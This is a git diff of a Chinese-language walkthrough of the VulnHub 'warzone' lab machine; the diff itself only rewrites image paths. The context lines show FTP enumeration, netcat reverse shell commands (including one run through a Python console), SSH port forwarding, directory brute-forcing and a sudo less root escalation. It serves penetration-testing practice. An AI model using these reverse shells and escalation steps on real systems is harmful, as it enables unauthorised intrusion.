@@ -12,33 +12,33 @@
 
 使用`arp-scan -l`或`netdiscover -r 192.168.1.1/24`扫描
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\1.jpg)
+![](./pic-2/1.jpg)
 
 # 信息收集
 
 ## 使用nmap扫描端口
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\2.jpg)
+![](./pic-2/2.jpg)
 
-![2-1](D:\stu\vulnhub\warzone靶场\pic-2\2-1.jpg)
+![2-1](./pic-2/2-1.jpg)
 
 ## FTP服务探测
 
 尝试使用匿名用户`anonymous`空密码登录测试，发现可以登录成功，并发现目录及目录下的三张PNG图片
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\3.jpg)
+![](./pic-2/3.jpg)
 
 把这些图片下载到`kali`中
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\4.jpg)
+![](./pic-2/4.jpg)
 
 查看图片信息，发现`username.png`和`password.png`是一种旗帜。应该是某种加密方法
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\5.jpg)
+![](./pic-2/5.jpg)
 
 直接百度搜索旗语，发现海军旗语与之对应
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\6.jpg)
+![](./pic-2/6.jpg)
 
 把两个图片中的信息进行按行一一对比，假设这里都是字母，并没有数字，若是数字结合起来，情况就有点太多，这应该不是靶场作者的目的
 
@@ -48,7 +48,7 @@
 
 查看`token.png`，发现是一种加密
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\7.jpg)
+![](./pic-2/7.jpg)
 
 
 
@@ -63,11 +63,11 @@ echo -n "semaphoresignalperson" | openssl dgst -sha256
 hash=833ad488464de1a27d512f104b639258e77901f14eab706163063d34054a7b26
 ```
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\8.jpg)
+![](./pic-2/8.jpg)
 
 再进行16进制转换
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\9.jpg)
+![](./pic-2/9.jpg)
 
 结果为`383333616434383834363464653161323764353132663130346236333932353865373739303166313465616237303631363330363364333430353461376232360a`
 
@@ -79,7 +79,7 @@ hash=833ad488464de1a27d512f104b639258e77901f14eab706163063d34054a7b26
 
 尝试把上面的信息结合起来，输入用户名和密码以及`token`，不过这里的`token`与图片中不符，是`hash`值
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\10.jpg)
+![](./pic-2/10.jpg)
 
 提示三种命令可用，那么尝试使用`nc`构造反弹`shell`
 
@@ -96,7 +96,7 @@ nc -e /bin/bash 192.168.1.16 9999
 nc -lvvp 9999
 ```
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\11.jpg)
+![](./pic-2/11.jpg)
 
 使用`dpkg -l | grep python`，查看靶机内有无安装`python`，发现`python3`
 
@@ -108,11 +108,11 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 发现密码`i_hate_signals!`
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\12.jpg)
+![](./pic-2/12.jpg)
 
 剩下的两个文件，`sh`脚本执行`jar`文件，把该文件下载到`kali`中，反编译后，发现为启动`1337`服务的代码
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\13.jpg)
+![](./pic-2/13.jpg)
 
 # 提权
 
@@ -120,25 +120,25 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 因为这个文件是在用户`flafman`用户家目录下的，所以猜测发现的密码是其密码，然后使用`ssh`连接登录
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\14.jpg)
+![](./pic-2/14.jpg)
 
 查看`flag`
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\14-1.jpg)
+![](./pic-2/14-1.jpg)
 
 ## 提权至admiral
 
 使用`find`寻找具有SUID权限的文件，发现`sudo`，尝试查看该文件，发现没有权限
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\15.jpg)
+![](./pic-2/15.jpg)
 
 尝试以`admiral`执行脚本
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\15.jpg)
+![](./pic-2/15.jpg)
 
 发现开启了某种服务，并且给出了一个PIN值
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\16.jpg)
+![](./pic-2/16.jpg)
 
 不过是开启在靶机内的地址端口，不过这里可以使用`ssh`连接，那么就可以尝试在`kali`中进行端口转发，把靶机内的本地服务进行转发
 
@@ -146,11 +146,11 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 ssh -L 5000:127.0.0.1:5000 flagman@192.168.1.71 -Nf
 ```
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\17.jpg)
+![](./pic-2/17.jpg)
 
 在`kali`浏览器访问本地的`5000`端口
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\18.jpg)
+![](./pic-2/18.jpg)
 
 尝试进行目录爆破
 
@@ -158,11 +158,11 @@ ssh -L 5000:127.0.0.1:5000 flagman@192.168.1.71 -Nf
 gobuster dir -u http://127.0.0.1:5000 -w /usr/share/wordlists/dirb/big.txt -b 404,403
 ```
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\19.jpg)
+![](./pic-2/19.jpg)
 
 访问`console`，发现需要提供一个PIN，在前面开启脚本的时候，有一个PIN的提示，输入前面的PIN后，发现获取一个类似终端的界面，测试使用，结合前面的脚本为`py`，确定为`python`终端
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\20.jpg)
+![](./pic-2/20.jpg)
 
 那么尝试进行`python`的反弹`shell`，在`kali`中先进行监听，不过测试后发现`bash`反弹无效，更换为`nc`反弹，不过这里并未显示`nc`反弹命令，但是直接反弹成功
 
@@ -171,25 +171,25 @@ import os
 os.system("nc -e /bin/sh 192.168.1.16 7777")
 ```
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\21.jpg)
+![](./pic-2/21.jpg)
 
 使用`python3`获取交互式界面，然后查看其目录下的`flag`
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\22.jpg)
+![](./pic-2/22.jpg)
 
 ## 提权至root
 
 还是测试`sudo -l`，发现无需密码，并且是一个`less`提权
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\23.jpg)
+![](./pic-2/23.jpg)
 
 可以借助网站`gtfobins.github.io`查看其他方式
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\24.jpg)
+![](./pic-2/24.jpg)
 
 提权成功
 
-![](D:\stu\vulnhub\warzone靶场\pic-2\25.jpg)
+![](./pic-2/25.jpg)
 
 # 清理痕迹
 
